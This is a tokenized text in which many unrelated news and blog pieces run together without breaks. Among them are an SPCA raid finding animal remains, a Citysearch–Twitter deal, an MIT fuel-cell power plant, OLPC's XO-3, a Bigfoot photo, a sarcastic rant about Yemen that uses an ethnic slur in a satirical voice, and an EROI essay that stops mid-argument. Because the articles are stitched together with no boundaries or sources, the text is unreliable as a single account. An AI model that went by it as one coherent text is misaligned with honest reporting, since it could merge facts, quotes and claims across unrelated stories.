( CNN ) --
Investigators recovered the remains of more than 500 animals after executing a search warrant Wednesday at a home in the Feltonville section of Philadelphia , Pennsylvania , according to the city 's chapter of the Society for the Prevention of Cruelty to Animals .
The group 's director of law enforcement said he believes the animals -- the majority of which were chickens -- were sacrificed as part of a Santeria religious ritual .
The animals included " dozens of sheep , goats ... every type of farm animal you can think of , " the Philadelphia SPCA 's law enforcement director , George Bengal , said .
The SPCA believes two sets of remains are those of small primates , possibly monkeys .
Philadelphia SPCA enforcement officers were first called to the home over the weekend to tend to two emaciated dogs .
The organization said that after obtaining a search warrant , its officers found the home littered with animal remains .
The officers also found an AK - 47 , ammunition , dozens of knives and an altar with candles , the group said .
Philadelphia police were called after that , and Wednesday 's search resulted .
The dogs were dirty and malnourished .
They were put in protective custody after medical evaluation and treatment , the Philadelphia SPCA said .
Bengal said that the U.S. Supreme Court has ruled that rituals of Santeria -- a religion similar to voodoo and originated in Cuba and Brazil -- are permitted under the Constitution .
But he believes these animals may not have been sacrificed humanely .
If that is the case , the home 's owner could be prosecuted , he said .
" It 's a gray area ... a fine line , " Bengal said .
The home 's owner has n't been seen for eight months but is believed to be in Mexico , Bengal said .
A woman living at the home was last seen there five days ago and is believed to still be in the Philadelphia area , Bengal said .
The only rooms of the three - bedroom home without bones were the master bedroom and the bathroom , according to Bengal .
Animal sacrifices in Santeria rituals are common in Philadelphia , but this case stands out because of the number and condition of the animals involved , Bengal said .
" This place was incredible , " he said .
A new partnership between Citysearch and Twitter offers some clues about what Twitter ’s long - awaited paid accounts for businesses might look like .
Citysearch announced on Monday that it will provide the businesses on its site a few tools to help them make use of Twitter — and said that more tools would be coming soon , including some that sound a lot like what Twitter has repeatedly said it will offer businesses for a fee .
Businesses will be able to write tweets from their Citysearch page and create a Twitter account from Citysearch ’s Web site , the first time it has been possible to sign up for Twitter without going to Twitter.com .
“ We ’re excited about it because it ’s a step to demystify Twitter , to help small businesses get on from a site they ’re comfortable with , ” said Kara Nortman , senior vice president of publishing at Citysearch .
Many of the types of businesses that appear on Citysearch have been using Twitter as a marketing tool .
Citysearch will also incorporate tweets about a business into its profile page , so people reading about a restaurant , for example , will be able to see what people have recently tweeted about it .
Though people can review businesses on Citysearch , they generally do not do so as actively as they do on Yelp , Citysearch ’s competitor , so this will be a way to bring more of the customer ’s perspective onto Citysearch .
Citysearch wants to become a directory of social media listings , Ms. Nortman said , so that any time someone is looking for a business ’s Twitter or Facebook page , for example , they can find it on Citysearch .
That will also be useful on Citysearch ’s mobile application , because people who want to tweet about a restaurant or bar while they are out can easily find the Twitter name of the business .
Perhaps more intriguing , Ms. Nortman said that Citysearch ’s new offerings are the first step in a plan to offer small businesses a bunch of information to help them “ understand when and how and where their business is being talked about across the Web . ”
This will include analysis of what people are saying and whether the sentiments are positive or negative .
That matches up with what Twitter ’s co-founders have said Twitter will eventually do , and Ms. Nortman confirmed that the two companies have discussed doing this together .
“ Our conversations have involved that as a next stage in the partnership , ” she said .
“ They ’ll be offering corporate services through their partners . ”
Evan Williams , Twitter ’s co-founder and chief executive , recently told me something similar , although he suggested that any partnerships would n’t be exclusive .
So far , when Twitter has released a new feature , like location - aware tweets or Lists , it has made the technology available to all third - party developers building Twitter applications through the API .
When Twitter unveils commercial accounts , it will do the same thing , Mr. Williams said .
“ We do n’t plan to do everything , and we plan to offer an API for everything we do , ” he said .
“ It ’s the same thing with anything commercial –- it will be a platform for other people to build upon and make money as well . ”
A new type of natural - gas electric power plant proposed by MIT researchers could provide electricity with zero carbon dioxide emissions to the atmosphere , at costs comparable to or less than conventional natural - gas plants , and even to coal - burning plants .
But that can only come about if and when a price is set on the emission of carbon dioxide and other greenhouse gases — a step the U.S. Congress and other governments are considering as a way to halt climate change .
In findings recently published online in the Journal of Power Sources , postdoctoral associate Thomas Adams and Paul I. Barton , the Lammot du Pont Professor of Chemical Engineering , propose a system that uses solid - oxide fuel cells , which can produce power from fuel without burning it .
The system would not require any new technology , but would rather combine existing components , or ones that are already well under development , in a novel configuration ( for which they have applied for a patent ) .
The system would also have the advantage of running on natural gas , a relatively plentiful fuel source — proven global reserves of natural gas are expected to last about 60 years at current consumption rates — that is considered more environmentally friendly than coal or oil .
( Present natural - gas power plants produce an average of 1,135 pounds of carbon dioxide for every megawatt - hour of electricity produced — half to one - third the emissions from coal plants , depending on the type of coal . )
Natural gas already accounts for 22 percent of all U.S. electricity production , and that percentage is likely to rise in coming years if carbon prices are put into effect .
For these and other reasons , a system that can produce electricity from natural gas at a competitive price with zero greenhouse gas emissions could prove to be an attractive alternative to conventional power plants that use fossil fuels .
The system proposed by Adams and Barton would not emit into the air any carbon dioxide or other gases believed responsible for global warming , but would instead produce a stream of mostly pure carbon dioxide .
This stream could be harnessed and stored underground relatively easily , a process known as carbon capture and sequestration ( CCS ) .
One additional advantage of the proposed system is that , unlike a conventional natural gas plant with CCS that would consume significant amounts of water , the fuel - cell based system actually produces clean water that could easily be treated to provide potable water as a side benefit , Adams says .
Although no full - scale plants using such systems have yet been built , the basic principles have been demonstrated in a number of smaller units including a 250 - kilowatt plant , and prototype megawatt - scale plants are planned for completion around 2012 .
Actual utility - scale power plants would likely be on the order of 500 megawatts , Adams says .
And because fuel cells , unlike conventional turbine - based generators , are inherently modular , once the system has been proved at small size it can easily be scaled up .
“ You do n’t need one large unit , ” Adams explains .
“ You can do hundreds or thousands of small ones , run in parallel . ” Adams says practical application of such systems is “ not very far away at all , ” and could probably be ready for commercialization within a few years .
“ This is near - horizon technology , ” he says .
Adams and Barton , with funding from the BP - MIT Conversion Research Program , used computer simulations to analyze the relative costs and performance of this system versus other existing or proposed generating systems , including natural gas or coal - powered systems incorporating carbon capture technologies .
Combined - cycle natural gas plants — the most efficient type of fossil - fuel power plants in use today — could be retrofitted with a carbon - capture system to reduce the output of greenhouse gases by 90 percent .
But the MIT researchers ’ study found that their proposed system could eliminate virtually 100 percent of these emissions , at a comparable cost for the electricity produced , and with even a higher efficiency ( in terms of the amount of electricity produced from a given amount of fuel ) .
Jack Brouwer , associate director of the National Fuel Cell Research Center at the University of California , Irvine , says that the high efficiency and the carbon separation capabilities of solid - oxide fuel cell technology “ are indeed impressive .
” Absent any price for carbon emissions , Adams says , when it comes to generating electricity “ the cheapest fuel will always be pulverized coal . ”
But as soon as there is some form of carbon pricing — which attempts to take into account the true price exacted on the environment by greenhouse gas emissions — “ ours is the lowest price option , ” he says , as long as the pricing is more than about $ 15 per metric ton of emitted carbon dioxide .
Such a pricing mechanism would be put in place , for example , by the Waxman - Markey “ American Clean Energy and Security Act ” that was passed by the U.S. House of Representatives in July , through its “ cap and trade ” provisions .
( A corresponding bill has not yet reached the floor of the U.S. Senate . )
If the program becomes law , the actual price per ton of carbon would vary , being determined through the free market .
CCS is considered the only practical way of meeting reduced emissions targets under a cap - and - trade program , because alternatives to the use of fossil fuels are not far enough advanced to be able to quickly replace them at reasonable cost .
CCS involves separating out the carbon dioxide from other gases in the plant ’s exhaust , and then injecting them into deep geological formations ( for example , in depleted oil wells ) to keep them from going into the atmosphere .
Most approaches to capturing the carbon dioxide emissions from a fossil - fuel power plant require the use of a chemical solvent that absorbs the carbon dioxide from a mixture of gases — a process that is inherently inefficient and adds significantly to the cost of the power produced .
Adams and Barton ’s system eliminates this inefficient separation step .
One of the critiques most often leveled against proposals for fuel - cell power plants is that the technology has high initial costs compared to conventional combustion technologies .
But the new study found that once carbon pricing is in effect , even if the cost of fuel cells remains more than double that targeted by the U.S. Department of Energy for 2010 , the solid - oxide fuel cell system would be the cheapest option available in terms of lifecycle costs of electricity produced , even though the up - front capital costs could be three to four times greater than for natural gas or coal combustion systems .
In fact , the system ’s predicted efficiency is so high that it beats the lifecycle cost of a combined - cycle natural gas plant , even without carbon pricing .
And the study shows that a very low level of carbon tax , on the order of $ 5 to $ 10 per ton , would make this technology cheaper than coal plants , which are currently the lowest cost option for electricity generation .
SACRAMENTO , Dec. 21 ( UPI ) --
Authorities in California said an 11 - year - old boy was unharmed after getting locked inside a gun safe at a Costco store .
Jim Doucette of the Sacramento City Fire Department said the door closed while the boy was playing in the safe Sunday and emergency responders were called when employees initially had trouble opening the safe , KCRA - TV , Sacramento , reported Monday .

" Our initial concern is that he was going to run out of air .
So , our crews were ready to drill holes in the safe to give him some air , " Doucette said .
However , Doucette said employees were able to open the door and the boy was freed unharmed .
Costco officials said they will either remove the safes from the floor or have them secured so children cannot climb inside .
PORTLAND , England , Dec. 7 ( UPI ) -- A British prisoner convinced guards his marijuana plants were tomato plants -- and they even allowed him to decorate one as a Christmas tree , a source said .
Mohamed Jalloh , 28 , of Brent , North London , grew his pot plants at Verne Prison in Portland , Dorset , in southern England , and for five months , guards admired his gardening , The Sun reported Saturday .

But after another inmate told guards what the plants really were , they checked out photos of marijuana plants on the Internet , and the jig was up .
" You could see the plants from the grounds , as his cell looks on to the education department and communal outside area , " a source said .
" They were on show for the world to see . "

THE BALLAD OF ST .
ANSELM
Once a jolly friar got himself an argument
And could n't get it out of his mind .
He thought that he could prove the existence of the Deity
Because of the way that the words are defined .
CHORUS
Thus spake St. Anselm , thus spake St. Anselm ,
Thus spake St. Anselm , who now is long dead ,
And we 're awed as we read his proof so ontological ;
Who can deny a word that he said ?
If that than which nothing greater can be conceived
Can be conceived not to exist ,
Then 'tis not that than which nothing greater can be conceived :
This is unquestionable , I insist .
For in that case a being greater can be conceived ,
Whose major traits we can easily list :
Namely , that than which nothing greater can be conceived
And which can not be conceived not to exist .
For if that than which nothing greater can be conceived
Has no existence outside of man 's mind ,
Then 'tis not that than which nothing greater can be conceived ,
Due to the way that the words are defined .
For in that case a greater can be conceived
( This is of course analytically true ) ;
Namely , that than which nothing greater can be conceived
And which exists in reality too !
CHORUS
Thus spake St. Anselm , thus spake St. Anselm ,
Thus spake St. Anselm with weighty intent ,
And we 're awed as we read his proof so ontological
Would that we could understand what it meant .

In Pictures : Designing the OLPC
The group behind the $ 100 laptop has revealed the design for its latest computer aimed at connecting children in the developing world .
The XO - 3 , as it is known , is a slim - line touchscreen tablet PC .
One Laptop per Child ( OLPC ) said it would be " available in 2012 " and would cost " well below $ 100 " .
The new design replaces the proposed XO - 2 , a foldable e-book that was first shown off in 2008 but has since been scrapped by the organisation .
The XO - 3 will eventually replace the original XO laptop that first went into production in 2007 .
The innovative machines , which have been designed for use in remote and harsh environments , were designed for use by school children and featured a sunlight readable display and open source software .
' Bigger appeal ' OLPC originally aimed to sell the low - cost laptops in lots of one million to governments in developing countries for $ 100 each .
However , the non-profit organisation had difficulty getting governments to commit to bulk orders .
The machines - which are able to run both Linux and Microsoft Windows - are now offered in single units and cost around $ 200 .
The XO - 2 has been scrapped in favour of the XO - 3
So far the XO has been distributed to more than 1.4 million children in 35 countries .
The high - price has not however put off all governments .
Uruguay has bought a computer for every one of their school children .
Walter de Brouwer , CEO of OLPC Europe said that these " saturation projects " were the future of the organisation both in the developed and the developing world .
" I 'm talking to three four countries in the EU at the moment , " he told BBC News .
" Once one says yes , the others can't say no . "
The organisation believes the new design will cost significantly less .
Mr Brouwer said that because of the pace of technological change and the ever decreasing prices of electronics he could imagine the design selling for " 50 , 60 or 70 euros " .
He said governments could pay this back over a number of years , allowing pupils to have a laptop for less than one euro per month .
" This is very realistic , " he said .
The concept shows a touchscreen , a camera , induction charger , and a carrying ring on one of its corners .
Its inner workings - including a chip from UK firm ARM - will come from an interim design - the XO 1.75 - set for launch in 2011 .
The 1.75 will merge elements of the current machines with technologies - such as a touchscreen - intended to be included in the XO - 3 .
OLPC recently said that the organisation would just focus on promoting its concepts and educational aims , rather than manufacturing laptops .
" We are not a laptop company , " said Mr Brouwer .
" Manufacturing a laptop is not such a big deal .
The bigger appeal for us is deploying them and integrating them with education systems to transform a society . "
Nicholas Negroponte , founder and chairman of the group , said that he hoped that industry would now copy the design for the XO - 3 .

Advertisement " It 's a challenge and a brave decision , but our patients are driving it , " says Anurag Golash , a consultant urologist at the University of North Staffordshire Hospital .
The centre is the only place in the world to perform kidney removal using keyholes as day case surgery .
The patient is allowed to go home the same day as the operation , rather than stay in hospital overnight , if they so wish .
Usually it is typical for a patient to stay in hospital for one to three nights after such an operation .
Comfort of your own home " I was given the choice - I chose going home , " said Mr Littlejohn , just arrived home after having a kidney removed .
" I get bored in hospital , nothing is better than being in your own bed .
" I have my sport on TV and my family around to help me . "
Patients also benefit from a quieter place to recover , are less likely to have their operation cancelled due to lack of beds or pick up a hospital - acquired infection .
When Mr Golash started offering this option to his patients in 2006 it did raise a few eyebrows within the medical community .
Mr Golash : " It was a brave decision and a very stressful one . "
" He was questioning conventional wisdom and did receive some criticism , " said Dr Ian Smith , anaesthetist and President - elect of the British Association of Day Surgery ( BADS ) .
Since then the hospital has performed 30 kidney removal operations as day case surgery .
Only one woman decided to return to hospital after feeling insecure at home .
As well as kidney removal , the University of North Staffordshire Hospital is the only place in the UK to perform removal of the adrenal glands ( eight so far ) and pyeloplasty ( relieving obstruction of the kidney - 30 to date ) as day case .
Apart from keyhole renal surgery , this hospital also performs laser prostate surgery as day case .
A safety net Day surgery for simpler operations such as gall bladder removal , hernias , and tonsillectomy is now routine , but it is the risk to patient safety of performing more major surgery as day case , that has some people concerned .
Mr Golash said : " The main worry is bleeding , but in my opinion , if this happens , it is during the time of the operation and sorted then and there .
" It does n't tend to happen 24 - 48 hours after the operation , in my experience . "
The patient is then monitored and evaluated in hospital for six to eight hours before a decision is made to send them home .
A district nurse checks on the patient in the evening and subsequent days afterwards and the patient administers their own pain relief .
Wayne Littlejohn was in and out of hospital in a day " We do n't want patients to feel like we have kicked them out , " said Mr Golash .
" We give then emergency telephone numbers to ring back directly to the urology ward if there is any problem .
There is a big safety net in place . "
In the early days , such was Mr Golash 's support and dedication to a new way of thinking , he would even phone his patients himself in the evening to check their progress .
Thinking about pain
Not every patient having a kidney removed may be suitable for day case surgery - there are rigorous selection factors .
These look at how well the patient can be supported at home , the patient 's general health and the complexity of the operation .
Approximately 15 - 20 % of patient 's in Mr Golash 's practice are suitable for day case kidney removal .
One of the main differences between day case and inpatient procedures is pain relief .
" We need to plan the pain relief more carefully with a day case patient , " says Dr Smith .
" With an inpatient we tend not to think ahead so much as we can be more reactionary . "
Rather than using the traditional pain relief drug morphine , which can make patients sick , Dr Smith uses slow releasing ibuprofen and supplements this with paracetamol and codeine after the operation .
Currently around 60 % of all surgery in the UK is day case surgery , but Dr Smith would like to see more major surgery exploring this option .
" Historically we have asked : ' Is this patient suitable for day surgery ? '.
" What we need to start asking is : ' Is there any reason to admit this case as an inpatient ? '
" We need a cultural shift in thinking , both from patients and medical staff , about the need to stay in hospital . "

The band headlined last year 's Reading and Leeds festivals
Rock band Rage Against
The Machine is ahead of X Factor winner Joe McElderry in the race for the Christmas number one , early sales figures suggest .
A Facebook group aiming to get the band 's 1992 hit Killing In The Name to the top of the festive chart has attracted more than 750,000 members .
But McElderry 's debut The Climb , out on CD on Wednesday , is expected to catch up by the weekend .
The Official Charts Company ( OCC ) said it is " a very exciting battle " .
Campaign criticism
It is understood that there is a 10 % margin in sales between the two singles after Sunday and Monday .
McElderry 's song was only released digitally after his victory in the X Factor final at midnight on Sunday , giving it less time to rack up sales for this week 's chart than Rage Against The Machine .
X Factor judge Simon Cowell has criticised the internet campaign , calling it " stupid " .
Prior to the final of the ITV talent show , he said : " I think the campaign 's aimed directly at me . "
The Facebook page includes a link to homeless charity site Shelter , which has raised nearly £ 30,000 in donations .
Rage Against
The Machine , meanwhile , are signed to Epic Records , which is part of Sony BMG , the same label as McElderry .
Ladbrokes has re-opened its betting for the number one Christmas single just 24 hours after closing it .
Ladbrokes spokesman , Nick Weinberg , said : " Earlier this week it looked a done deal .
Now Joe appears to be facing an almighty battle for top spot .
" This Christmas could be the first time in a long while that we see a genuine competition . "
McElderry is at 1/3 with Rage Against the Machine at 2/1 .
The OCC's Martin Talbot said " two different records have captured the nation 's imagination " .
" According to our initial sales estimates , there is no doubt that this tussle is far from over , " he added .
It would appear that John Frusciante is no longer working with the Red Hot Chili Peppers - so says a source close to the band in an exclusive interview with MusicRadar .
" Josh Klinghoffer has been playing with the group for a couple of months now , " says the source .
" Optimistically , the Peppers are trying to lock down a replacement for John , who has apparently quit .
" Mentally , John checked out a long time ago .
He 's interested in doing his own thing , his own albums - the whole big rock band machinery just does n't appeal to him anymore . "
The news that Frusciante has quit can hardly be viewed as surprising .
During a podcast interview with MusicRadar earlier this year , the guitarist was lost for words during a routine question about the status of the group .
He paused for nearly 30 seconds ( later edited ) before awkwardly stating that the Peppers had " no plans . "
Frusciante also refused to be introduced to be as ' guitarist for the Red Hot Chili Peppers , ' preferring instead to be called , simply , ' guitarist . '

Frusciante has up and quit before
This would n't be the first time Frusciante has split from the band : Overwhelmed by the success of Blood Sugar Sex Magik , he quit in 1992 and descended into heroin addiction .
After kicking drugs cold turkey , he rejoined the Peppers in 1999 for the album Californication ( the group had fired his replacement , Dave Navarro , a year earlier ) .
Still , the past decade has n't been an easy ride for Frusciante .
Intensely private , he has issued a number of wildly experimental , introspective solo recordings - a stark contrast to the over - the - top , circus - like antics of life in the Chili Peppers .
Rumors of his commitment to the band resurfaced late last month when , during an interview with Classic Rock magazine , drummer Chad Smith , responding to a question about Frusciante 's involvement , stated : " Well ... at this time I can't talk about that .
I have been told to stay away from the John questions . "
" The big thing right now that the band will have to consider is , Can Josh write great songs ?
Can he help push them forward ? "
A source close to the Red Hot Chili Peppers on Josh Klinghoffer , who is said to be working with the group
Klinghoffer 's a well - liked LA player
Oddly enough , Klinghoffer is not only friends with the Chili Peppers but with Fruscinate as well .
" Josh has been on everybody 's radar for quite some time , " says the source .
" He 's extremely popular within a certain circle of LA musicians .
" The big thing right now that the band will have to consider is , Can Josh write great songs ?
Can he help push them forward ?
Everybody knows he can play , but the Peppers need somebody who can come up with amazing material and get them moving again . "
Following the original posting of this story , John Frusciante has now confirmed that he has left the Red Hot Chili Peppers .

Tim Kedrowski and his sons , Peter and Casey , are not pushovers for Bigfoot stories , but a frame on a game trail camera set up on their hunting land north of Remer has left them in a quandary .
“ To us , it ’s very hard because we lean toward the skeptical type , ” Kedrowski said in a telephone interview from his Rice , Minn. , home .
But after checking with neighbors and any other hunters who might have been walking through the dense woods at 7:20 p.m. on the rainy night of Oct. 24 , he said they could n’t imagine what else the image could be .
Tim said he considered ideas from a bear to a bow hunter in a fuzzy suit .
But the arm and hand could n’t be a bear ’s , or its upright gait .
And there is no evidence in the photo of a bow or flashlight a hunter might be using to track a wounded deer .
The Kedrowskis checked the Minnesota Bigfoot Web site and came up with the names of Don Sherman and Bob Olson , the Northern Minnesota Bigfoot Research Team .
Sherman is the facilities manager for the Cass Lake Indian Health Service Hospital , and Olson is an auto body repairman in Deer River .
Sherman has responded to numerous area Bigfoot sighting reports and has made casts of footprints .
He said he once caught footage of a Bigfoot on a thermal imaging camera and heard its warbling call .
When Sherman saw the image the Kedrowskis sent him , Tim said the researcher responded that he believes it is a picture of a Bigfoot .
Sherman went with the Kedrowskis to the photo site and measured the height of the creature in comparison the sapling next to it .
He determined the animal is about 7 feet tall .
“ I ’ve hunted there for 43 years , ” Tim said of their property near Shingle Mill Lake .
“ I ’ve seen one bear off my deer stand .
I ’ve seen three timber wolves . ”
Casey Kedrowski said he and his brother had gone out to the family ’s hunting shack prior to deer season to bring in firewood and make other preparations .
They set up a game trail camera to see what might be wandering around their property .
Casey said he and his brother were the only people who knew where the camera was located .
They took the camera down when deer season started , and a couple of weeks later checked on what they had caught .
When they came to the picture of the long - armed creature walking upright , Casey said , “ We just looked at each other .
Each of us thought we were playing a trick on each other . ”
When they determined that neither of them had pulled a prank on the other , they checked to see if anyone had been in the area that night .
Tim said the only neighbors were two elderly hunters in their own shack , neither of whom matched the size and appearance of the creature caught on camera .
However , he said , when he asked the men about the night the camera clicked on the mystery , they said they had gone out about 2 a .m. to use the outhouse and had heard strange squealing noises .
Tim said he asked them to show him the direction of the sounds .
They pointed to the area where the camera had been , although they had no idea of its location .
Tim said he just released the photo and permission for its publication last weekend .
“ It was deer season and we wanted to concentrate on deer hunting , and ( we ) really wanted to talk to people in the area and … make sure they were n’t scamming us , ” he said .
“ We ’re not 100 percent sure , obviously .
After visiting with ( Sherman and Olson ) we feel they ’ve done a lot more investigation .
That ’s why we put it in their hands . ”
Sherman said the Northern Minnesota Bigfoot Research Team started receiving reports of Bigfoot sightings in 2006 and has had reports every year since , including four reports this year .
He said the first reported sighting he investigated was from a man running a road grader near Six Mile Lake south of Lake Winnibigoshish .
Sherman said he was able to make casts of the footprints .
A more recent sighting report was by a truck driver .
“ I ’ve talked to this guy — this was last year — he was coming from Crosby ( Minn . ) with a load of lumber by Washburn Lake , ” Sherman said .
“ It had hands , he said , like baseball mitts .
It took three steps to cross the road .
He was pretty shook up . ”
In spite of such seemingly credible reports , biologists remain unconvinced .
“ Personally , I do n’t buy the fact this thing exists , ” said Blane Klemek , assistant wildlife manager with the Minnesota Department of Natural Resources in Bemidji .
“ There are certainly species that are discovered each year - but megafauna — rare is it a big mammal is discovered , ” he said .
He noted the belief that the ivory - billed woodpecker is not extinct after all is based on a fleeting , indistinct video image of some kind of woodpecker recorded in 2004 in the Big Woods of Arkansas .
No other sightings have been reported .
He also noted than no one has ever found a Bigfoot carcass .
“ All organisms die ; they do n’t just go away , ” Klemek said .
“ You ’d think someone someday would find one . ”
Evan Hazard , Bemidji State University retired mammalogist , also expressed doubt about the Bigfoot ’s existence .
“ I just do n’t know , ” he said .
“ My background in mammalogy makes me skeptical , not expert .
My inclination is to say we really do n’t have good evidence . ”
Hazard said proof would be a clear photo matched with footprints at the same site — multiple pieces of overlapping evidence .
Sherman said the research would go on .
He said he believes the Bigfoot is intelligent and perfectly at home in the woods .
“ That ’s why they ’re so elusive , ” he said .
“ They know the woods better than any hunter because they live it . ”
One thing the hunters agree on is that even if they could produce a carcass for examination , they would n’t shoot a Bigfoot .
“ Absolutely not — no way , ” said Tim .
“ I asked my sons would they shoot it , and they said no .
It has every right to live . ”
“ I ’ve talked to people who ’ve had them in their sights and their scopes , and they said they could n’t pull the trigger , ” she Sherman .
He urged anyone who wants to report a Bigfoot sighting or evidence of the creature to call him at 218-308- 1451 or Olson at 218-246-8493 .
“ We ’ve got all kinds of equipment , night vision , cameras , listening devices , ” Sherman said .

Wow , that did n't take long at all .
Scant days after the American war machine took the cloaking device off its direct military involvement in Yemen , we have an alleged attempted terrorist attack by an alleged attempted terrorist who , just scant hours after his capture , has allegedly confessed to getting his alleged attempted terrorist material from ... wait for it ... Yemen !
Yemen - trained terrorists on the loose in American airplanes !
At Christmas !
Great googily moogily !
It 's a good thing our boys are on the case over there right now , pounding the holy hell outta some of them Al Qaeder ragheads !
And to think , a few pipsqueaky fifth columnists had been starting to wonder why we were killing dozens of innocent civilians on behalf of an authoritarian regime embroiled in a three - way civil war on the other side of the world .
Well , now they have their answer , by God !
Alleged attempted terrorists allegedly trained in Yemen !
What else do you need -- a freaking warrant or something ?
We would obviously be justified in nuking that desert hell - hole and everybody in it !
Just think of it -- some guy with some kind of something on an airplane , right there in the Heartland !
You gonna stand for that ?
Exterminate the brutes !
And yet , because we are good , because we are godly , because our heart is always in the right place , even when -- as President Obama himself admitted in his noble Nobel Speech -- we sometimes make mistakes , we have not brought down the full force of the iron rod that God himself has placed into our hands for the chastisement and right order of the world .
No , there will be no nukes falling on the children of Yemen tonight .
But boy howdy , they 'd better get ready for some sure - enough heavy ordnance -- fired from distant ships , from far - flung bases and from computer consoles in leafy Stateside suburbs , where you can bravely kill some alleged attempted somebody - or - other ( and everyone in their immediate vicinity ) , and still make it home in time to to eat supper with the kids .
So here we are .
Just one day after the alleged attempted terrorist incident in Detroit , we already have headlines blaring in the New York Times , the " paper of record , " tying the alleged attempt to Yemen .
How quick and convenient is that ?
Already the echo chamber is roaring with the all - justifying cacophony : " Terror , Yemen , al Qaeda , Homeland , Bomb , Terror , Yemen , Yemen , al Qaeda . "
And it must be true , right ?
I mean , just look at how well - sourced the NYT story is .
" A law enforcement official " -- Police captain ?
State trooper ?
G - Man ? Traffic cop ? -- said that the alleged attempted terrorist said he'd got his " explosive chemicals " from Yemen .
( Elsewhere in the paper , other unnamed officials told NYT reporters that the alleged material strapped to the alleged attempted terrorist was " incendiary , " not explosive .
But who cares ?
" Bomb , Terror , Yemen ! " )
Of course , the NYT noted that " authorities have not independently corroborated the Yemen connection claimed by the suspect " ( nor , they could have added , have they independently corroborated that the claim was actually made ) , but still , the completely anonymous " law enforcement official " said that the suspect 's claim " was plausible , " and even added : " I see no reason to discount it . "
Well , it does n't get more solid than that , does it ?
They nailed that story down so tight you could n't pry it open with God 's own crowbar .
An anonymous source confirmed the plausibility of his own claim .
Man , that 's ironclad .
It 's certainly good enough to light up the media firmament with headlines linking " terror in the Heartland " with the empire 's newest killing field in a volatile foreign land .
And it turns out that the suspected attempted terrorist , Umar Farouk Abdulmutallab , was already on the radar of our all - encompassing security services -- just like the last Muslim terrorist in the heartland , Major Nidal Hasan .
( And , for that matter , just like many of those accused of carrying out the 9/11 attack . )
As in almost all of these cases , the question arises :
Who is running whom ?
( For more , see " Darkness Renewed : Terror as a Tool of Empire . " )
But this query is precisely the kind of pantywaist handwringing that rightly goes down in the flood of the he-man Homeland Security strutting that always follows these incidents .
As we noted here the other day , there 's no time for depth , context , history -- or even facts -- when the " frame " is screaming " Terror ! "
In any case , whatever facts about the case -- or rather , shards and splinters of filtered information -- that are allowed to emerge from the depths of the security apparat , you can be absolutely sure that , as always , the " facts will be fixed around the policy . "
And what is that policy ?
Why , endless war , of course !
The American war machine ( which now dominates most of " civilian " society as well ) is like a shark : it must keep moving , and feeding , or die .
" Terror , Bomb , Yemen ! "
In this post I will talk about a topic which is likely familiar : Energy Return on Investment or EROI .
I will also talk about Energy Internal Rate of Return ( EIRR ) , a measure which is similar to EROI , but reflects how quickly society gets its energy return back from its energy investment .
Current renewable energy technologies must be adopted in conjunction with aggressive Smart Growth and Efficiency if we hope to continue our current standard of living and complex society with diminished reliance on fossil fuels .
These strategies have the additional advantage that they can work without large technological breakthroughs .
Energy Return on Investment
Energy keeps our economy running .
Energy is also what we use to obtain more energy .
The more energy we use to obtain more energy , the less we have for the rest of the economy .
The concept of Energy Return on Investment ( EROI ) , alternatively called Energy Return on Energy Invested ( EROEI ) has been widely used to quantify this concept .
The following chart , from a SciAm paper , shows the EROI of various sources of energy , with the tan section of the bar representing the range of EROIs depending on the source and the technology used .
I 've seen many other estimates of EROI , and this one seems to be on the optimistic ( high EROI ) end for most renewable energy sources .
The general trend is clear : the energy of the future will have lower EROI than the energy of the past .
Low carbon fuels such as natural gas , nuclear , photovoltaics , wind , and biofuels have low EROI compared to high - carbon fuels such as coal and ( formerly ) oil .
The graph also clearly shows the decline in the EROI over time for oil .
Other fossil fuels , such as coal and natural gas , also will have declining EROI over time .
This happens because we always exploit the easiest resources first .
The biggest coal deposits that are nearest to the surface and nearest to customers will be the first ones we mine .
When those are depleted , we move on to the less easy to exploit deposits .
The decline will not be linear , and new technology can also bring temporary improvements in EROI , but new technology cannot change the fact that we 've already exploited all the easiest to get deposits , and new sources and technologies for extracting fossil fuels often fail to live up to the hype .
While there is room for improvement in renewable energy technologies , the fact remains that fossil fuels allow us to exploit the energy of millions of years of stored sunlight at once .
All renewable energy ( solar , wind , biomass , geothermal ) involves extracting a current energy flux ( sunlight , wind , plant growth , or heat from the earth ) as it arrives .
In essence , fossil fuels are all biofuels , but biofuels from plants that grew and harvested sunlight over millions of years .
I do n't think that technological improvements can make up for the inherent EROI advantage of the many - millions - to - one time compression conveys to fossil fuels .
Hence , going forward , we are going to have to power our society with a combination of renewable energy and fossil fuels that have EROI no better than the approximately 30:1 potentially available from firewood and wind .
Since neither of these two fuels can come close to powering our entire society ( firewood because of limited supply , and wind because of its inherent variability . )
Also , storable fuels such as natural gas , oil , and biofuels all have either declining EROI below 20 or extremely low EROI to begin with ( biofuels ) .
Energy storage is needed to match electricity supply with variable demand , and to power transportation .
Neither hydrogen nor batteries will replace the current storable fuels without a further penalty to EROI .
Whenever you store electricity , a certain percentage of the energy will be lost .
The percent that remains is called the round - trip efficiency of the technology , shown on the vertical axis of the graph below , taken from my earlier comparison of electricity storage technologies .
( Click to enlarge . )
Round trip efficiency ( RTE ) for energy storage technologies is equivalent to EROI for fuels : it is the ratio of the energy you put in to the energy you get out .
You can see from the chart , most battery technologies cluster around a 75 % RTE .
Hence , if you store electricity from an EROI 20 source in a battery to drive your electric vehicle , the electricity that actually comes out of the battery will only have an EROI of 20 times the RTE of the battery , or 15 .
Furthermore , since batteries decay over time , some of the energy used to create the battery should also be included in the EROI calculation , leading to an overall EROI lower than 15 .
The round trip efficiency of hydrogen , when made with electrolyzers and used in a fuel cell , is below 50 % , meaning that , barring huge technological breakthroughs , any hoped - for hydrogen economy would have to run with an EROI from energy sources less than half of those shown .
Taking all of this together , I think it 's reasonable to assume that any future sustainable economy will run on energy sources with a combined EROI of less than 15 , quite possibly much less .
It 's Worse than That : The Renewables Hump
All investors know that it matters not just how much money you get back for your investment , but how soon .
A 2 x return in a couple of months is something to brag about , a 2 x return over 30 years is a low - yield bond investment , and probably has n't even kept up with inflation .
The same is true for EROI , and means that users of EROI who are trying to compare future sources of energy with historic ones are probably taking an overly - optimistic view .
For fossil fuels , the time we have to wait between when we invest the energy and when we get the energy back in a form useful to society is fairly short .
For instance , most of the energy that goes into mining coal comes in the digging process , perhaps removing a mountaintop and dumping the fill , followed by the actual digging of the coal and shipping it to a coal plant .
Massey Energy 's 2008 Annual Report [ pdf ] states that " In 2008 ... we were able to open 19 new mines , and ten new sections at existing underground mines . "
